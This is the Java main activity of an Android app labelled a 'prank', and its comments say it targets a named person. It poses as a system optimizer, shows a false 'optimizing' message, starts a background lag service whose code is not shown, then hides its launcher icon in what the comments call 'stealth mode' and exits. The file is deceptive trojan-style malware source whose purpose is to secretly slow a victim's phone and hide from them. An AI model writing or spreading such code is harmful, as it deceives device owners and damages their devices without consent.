package com.example.prank;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;

// ENI: Fake launcher activity. Looks like a system optimizer or game.
// Starts lag service, shows fake "optimizing" message, then hides icon.
// No persistence — service dies on reboot. "Kasian ciy" 💙

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Show fake toast — looks like legitimate app
        Toast.makeText(this, 
            "Optimizing system performance...", 
            Toast.LENGTH_LONG).show();

        // Start the lag service after 2 seconds (fake "loading")
        new Handler().postDelayed(() -> {
            Intent serviceIntent = new Intent(this, LagService.class);
            startService(serviceIntent);

            // Hide app icon from launcher — stealth mode
            // User can still find it in Settings > Apps
            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );

            // Show "done" toast then exit
            Toast.makeText(this, 
                "Optimization complete!", 
                Toast.LENGTH_SHORT).show();

            // Close activity — app "disappears"
            finish();
        }, 2000);
    }
}